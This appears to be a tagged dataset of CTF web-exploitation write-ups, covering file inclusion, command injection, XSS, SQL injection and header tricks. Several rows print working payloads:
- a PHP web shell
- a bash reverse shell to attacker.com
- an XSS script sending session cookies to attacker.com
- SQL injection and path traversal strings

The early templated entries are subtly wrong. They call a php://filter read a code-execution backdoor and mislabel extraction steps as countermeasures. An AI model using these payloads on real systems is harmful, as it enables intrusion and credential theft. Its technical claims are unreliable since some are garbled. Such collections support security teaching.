"writeup_0023_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a File Inclusion vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the File Inclusion vulnerability to execute arbitrary code on the server. After researching the application's system and network configuration, I crafted a suitable payload containing PHP code that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as <?php system($_GET['cmd']); ?>. This payload allowed me to execute arbitrary code on the server and obtain sensitive information, such as the contents of system files or database credentials."
"writeup_0023_tagged.txt","web_exploitation","code","<?php system($_GET['cmd']); ?>"
"writeup_0023_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against File Inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with File Inclusion."
"writeup_0024_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a user input feature allowing users to execute system commands on the server. Given the potential security risks associated with allowing users to execute system commands, I suspected that the application might be vulnerable to Remote Code Execution (RCE), a type of vulnerability that allows attackers to execute arbitrary code on the server."
"writeup_0024_tagged.txt","web_exploitation","discovery","To test for RCE, I entered a malicious payload containing system commands into the user input parameter, such as ; ls -al, which would cause the application to execute the 'ls -al' command on the server."
"writeup_0024_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application executed the 'ls -al' command, confirming the presence of an RCE vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a reverse shell command that would open a shell on the attacker-controlled server, such as ; bash -i >& /dev/tcp/attacker.com/1234 0>&1. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server."
"writeup_0024_tagged.txt","web_exploitation","code","`; ls -al` `; bash -i >& /dev/tcp/attacker.com/1234 0>&1`"
"writeup_0024_tagged.txt","web_exploitation","discovery","To obtain the flag for the Web Exploitation challenge, I needed to use the RCE vulnerability to execute arbitrary code on the server and obtain sensitive information."
"writeup_0024_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against Remote Code Execution vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with RCE."
"writeup_0025_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a search feature allowing users to search for specific products. Given the potential security risks associated with cross-site scripting (XSS) vulnerabilities, I suspected that the application might be vulnerable to XSS attacks."
"writeup_0025_tagged.txt","web_exploitation","discovery","To test for XSS, I entered a malicious payload containing a JavaScript script into the search parameter, such as <script>alert('XSS');</script>, which would cause the application to execute the JavaScript script on the client-side."
"writeup_0025_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application executed the JavaScript script, confirming the presence of an XSS vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the XSS vulnerability to steal the user's session cookie and impersonate the user."
"writeup_0025_tagged.txt","web_exploitation","code","<script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>"
"writeup_0025_tagged.txt","web_exploitation","discovery","After researching the application's system and network configuration, I crafted a suitable payload containing a script that would steal the user's session cookie and send it to an attacker-controlled server, such as <script>new Image().src=""http://attacker.com/steal.php?cookie=""+document.cookie;</script>. This payload allowed me to steal the user's session cookie, impersonate the user, and gain access to the application's sensitive information."
"writeup_0025_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against XSS vulnerabilities by implementing proper input validation and output encoding controls, using content security policies, and validating user input. By exploiting the vulnerability, I was able to steal the user's session cookie, impersonate the user, complete the Web Exploitation challenge, and demonstrate the potential risks associated with XSS."
"writeup_0026_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a file inclusion feature allowing users to include files on the server. Given the potential security risks associated with file inclusion vulnerabilities, I suspected that the application might be vulnerable to file inclusion attacks."
"writeup_0026_tagged.txt","web_exploitation","discovery","To test for file inclusion, I entered a malicious payload containing a path traversal attack into the file inclusion parameter, such as ../../../../../../etc/passwd, which would cause the application to include the '/etc/passwd' file on the server."
"writeup_0026_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application included the '/etc/passwd' file, confirming the presence of a file inclusion vulnerability. After researching the application's system and network configuration, I crafted a suitable payload containing a script that would execute arbitrary code on the server and send the output to an attacker-controlled server, such as php://filter/convert.base64-encode/resource=index.php. This payload allowed me to execute arbitrary code on the server, obtain sensitive information, and establish a persistent backdoor to the server."
"writeup_0026_tagged.txt","web_exploitation","code","None"
"writeup_0026_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against file inclusion vulnerabilities by implementing proper input validation and output encoding controls, using whitelisting techniques, and validating user input. By exploiting the vulnerability, I was able to execute arbitrary code on the server, obtain sensitive information, complete the Web Exploitation challenge, and demonstrate the potential risks associated with file inclusion."
"writeup_0027_tagged.txt","web_exploitation","context","During a CTF competition, I encountered a web application that included a user login feature allowing users to login using their credentials. Given the potential security risks associated with SQL injection vulnerabilities, I suspected that the application might be vulnerable to SQL injection attacks."
"writeup_0027_tagged.txt","web_exploitation","discovery","To test for SQL injection, I entered a malicious payload containing a SQL injection attack into the login parameter, such as admin' --, which would cause the application to execute a valid SQL query and bypass the authentication mechanism."
"writeup_0027_tagged.txt","web_exploitation","exploitation","Upon submitting the payload, the application logged me in as an administrator, confirming the presence of an SQL injection vulnerability. To obtain the flag for the Web Exploitation challenge, I needed to use the SQL injection vulnerability to extract sensitive information from the database."
"writeup_0027_tagged.txt","web_exploitation","code","admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1."
"writeup_0027_tagged.txt","web_exploitation","discovery","After researching the application's database schema and structure, I crafted a suitable payload containing a script that would extract sensitive information from the database, such as admin' UNION SELECT 1,2,3,4,5,6,7 FROM sensitive_table WHERE '1'='1. This payload allowed me to extract sensitive information from the database, such as the flag for the Web Exploitation challenge."
"writeup_0027_tagged.txt","web_exploitation","countermeasures","This CTF writeup highlights the importance of properly securing web applications against SQL injection vulnerabilities by implementing proper input validation and output encoding controls, using parameterized queries, and validating user input. By exploiting the vulnerability, I was able to extract sensitive information from the database, complete the Web Exploitation challenge, and demonstrate the potential risks associated with SQL injection."
"01_basic_injection_tagged.txt","web_exploitation","context","Just like the title said, the task involves SQL injection (SQLi), which I really have not yet studied. Let's begin."
"01_basic_injection_tagged.txt","web_exploitation","discovery","I have a little experience and understanding of SQL so my study was not long, the point is to make the request valid, for example 1=1 is always true, so the server will return all of the items. This challenge is really friendly and shows what is the resulting query, which helps a lot."
"01_basic_injection_tagged.txt","web_exploitation","exploitation","We need to make the query valid, but not really a big riddle, my resulting input is '' or 'a'='a and the missing ' will be added by the server. The payload going to pull all the data from the database. This is because the input field is not sanitized which makes the searching field vulnerable to the SQL injection. A hacker can pull all the information from a database that included sensitive data."
"02_post_practice_tagged.txt","web_exploitation","context","This is actually a very easy challenge if you know about HTTP, I don't know why the author gave it a Medium difficulty. Let's begin. From the description alone we understand what is the challenge about. Make a POST request, and pass login information, the question is how it should look like and what information we need to pass. In the page we don't see much, checking the source will give us the credentials for the login. Nicely commented us `username: admin | password: 71urlkufpsdnlkadsf` so now we know what are the parameters we need to send, and what are their values."
"02_post_practice_tagged.txt","web_exploitation","discovery","For this task, you are required to play around with the HTTP-request header. By using Burp Suite, the request is originally a GET. Our objective is to change the request from GET to POST. If you look at the response, you should find the username and password for the POST request. As I said the challenge is very easy, it's not even a hard thing to learn how POST request works and what is it."
"03_dont_bump_your_header_tagged.txt","web_exploitation","context","When you visit the site, you can find the clue in the HTML code: ""Sorry, it seems as if your user agent is not correct, in order to access this website."""
"03_dont_bump_your_header_tagged.txt","web_exploitation","discovery","From the clue above, we have to change the User-Agent to Sup3rS3cr3tAg3nt before we send the request to the site. Using Postman, change the user agent and send GET request to /header.php. You will get this response: ""Sorry, it seems as if you did not just come from the site, 'awesomesauce.com'."""
"03_dont_bump_your_header_tagged.txt","web_exploitation","exploitation","You have to change the Referer in the header to awesomesauce.com then you send GET request again to /header.php. The response contains the flag in it."
"04_my_blog_tagged.txt","web_exploitation","context","This is a kind of very unique challenge. No vulnerability, no bug, just a clean blog site. Instead of a complete CTF challenge, this is a test of web development knowledge."
"04_my_blog_tagged.txt","web_exploitation","discovery","If you read the text carefully, ""you may find a good application for your memory."" That is a hint for the challenge. When the dev talked about memory, it must be something to do with the storage."
"04_my_blog_tagged.txt","web_exploitation","exploitation","Question is, how do we access the storage? It is simple, for Firefox browser, open the Developer Tools and go to storage."
"04_my_blog_tagged.txt","web_exploitation","discovery","I find the flag in the storage."
"05_inj3ction_time_tagged.txt","web_exploitation","context","This challenge is a website with a single input where we can search for an id."
"05_inj3ction_time_tagged.txt","web_exploitation","discovery","I'll check if the input is vulnerable. From the description you'll notice that there's SQLi. To check if the ID field is vulnerable to SQLi, the first payload I used was a simple 1', which returned no results. Then I tried 1 OR 1=1. It worked but did not give me anything interesting, so the flag must be somewhere else in the database. I started suspecting that the quotes character is blacklisted."
"05_inj3ction_time_tagged.txt","web_exploitation","discovery","Finding how many columns the query needs. Next, I started to look for how many columns the query needs to work. This information will be needed in a UNION attack."
"05_inj3ction_time_tagged.txt","web_exploitation","exploitation","So at this point, I just use SQLMap to enumerate the db."
"05_inj3ction_time_tagged.txt","web_exploitation","countermeasures","We must first extract the names of the existing databases. The next step is to extract the database information (table, columns, flag)."
"06_gobustme_tagged.txt","web_exploitation","context","The main idea is to bruteforce directories and files hidden in a website. We go to the URL and notice the Ghostbuster theme song, except ""Ghostbusters"" is replaced with ""Gobuster"". The site links Gobuster which explains what kind of software it is."
"06_gobustme_tagged.txt","web_exploitation","discovery","This is a personal preference but DirBuster is a GUI while Gobuster is a CLI which makes DirBuster slightly more beginner friendly. At the bottom of the website, common.txt is provided. This is a wordlist for possible lists to brute force. Set up DirBuster by configuring it to go to the website and use common.txt as the wordlist. If your computer can handle it, check off ""Go Faster"". After running for a bit, DirBuster will give all the results."
"06_gobustme_tagged.txt","web_exploitation","exploitation","Upon visiting /hide we see the message ""It was well hidden isn't it?"" and we get the flag."
"07_calculat3_m3_tagged.txt","web_exploitation","context","A simple command injection challenge will be demonstrated in this walkthrough. The site gives a calculator that you can click the buttons to input expression, then it will eval the expression and gives a result."
"07_calculat3_m3_tagged.txt","web_exploitation","discovery","I provided random input in this calculator and intercepted the request with BurpSuite. I got one parameter taking the values: expression: 5 * 6"
"07_calculat3_m3_tagged.txt","web_exploitation","exploitation","Try to get the contents in directory, set the expression to ;ls. Submit it to get a list of file names in result, the flag is the one starts with ctf."
"07_calculat3_m3_tagged.txt","web_exploitation","code",";ls"
"07_calculat3_m3_tagged.txt","web_exploitation","countermeasures","This challenge demonstrates the importance of properly validating user input and preventing command injection attacks. It also highlights the need for secure coding practices and regular security testing to identify and address vulnerabilities in web applications."
"08_audioedit_tagged.txt","web_exploitation","context","The challenge description said ""I made this cool site for editing audio files. Can you exploit it?"". After visiting the site, I got a simple page with written ""AudioEdit"" with the chance of upload a .mp3 audio file."
"08_audioedit_tagged.txt","web_exploitation","discovery","The provided file will be uploaded and the discovered insertion statement in the db looks like this: `INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'author','title'...);`."
"08_audioedit_tagged.txt","web_exploitation","exploitation","In order to do an SQL-injection we have to create a special author and title field. I used easyTAG but of course you can use the tool of your choice to modify mp3 metadata. In order to inject and maintain a valid INSERT statement you can create a mp3 with the following metadata: `title  = """" (not important) author = a', (SELECT @@version))-- -b`, which creates the following statement. This gave us the database version."
"08_audioedit_tagged.txt","web_exploitation","discovery","Next we wanted to know the tables name. And of course the columns names."
"08_audioedit_tagged.txt","web_exploitation","exploitation","Finally we get the flag."
"08_audioedit_tagged.txt","web_exploitation","code","INSERT INTO audioedit (..., foo, bla, ...) VALUES (..., 'a', (SELECT @@version))-- -b',''...);"
"09_grid_it_tagged.txt","web_exploitation","context","We are given a register/login panel on a webpage. After logging in, we see a 2D plane where we can add or remove points. Requests go through ""controller.php?action="", with various actions available."
"09_grid_it_tagged.txt","web_exploitation","discovery","We notice a PHP serialized object when deleting points. We try SQL Injection by modifying the object and all points disappear. We observe that the delete() function is invoked on the point object, hinting at PHP Object Injection. However, the classes containing the ::delete() method (Phar and PharData) seem useless for this task."
"09_grid_it_tagged.txt","web_exploitation","exploitation","We return to SQL Injection, aiming for Blind SQL Injection since there's no output. Our goal is to fetch table and column names inside the database. We create queries with conditions based on the comparison of ASCII codes of characters in the desired data. We perform a binary search to find the correct characters and retrieve the entire name. We find two tables and six columns. We fetch the admin's password with a similar query and obtain an MD5 hash."
"09_grid_it_tagged.txt","web_exploitation","countermeasures","After cracking the MD5 hash, we get the password: grapevine. Logging in as admin, we receive the flag: ctflearn{obj3ct_inj3ct1on}. The name is misleading as it wasn't an object injection, just object modification."
"10_prehashbrown_tagged.txt","web_exploitation","context","In the site we have a search bar that is SQL Injection vulnerable."
"10_prehashbrown_tagged.txt","web_exploitation","discovery","So, using Burpsuite, I capture the request header and saved as header.txt."
"10_prehashbrown_tagged.txt","web_exploitation","discovery","I started to enumerate the database using SQLMap. So, I tried to enumerate a certain table."
"10_prehashbrown_tagged.txt","web_exploitation","exploitation","The flag is within the table and I dumped all information from the table. Finally I get the flag!"
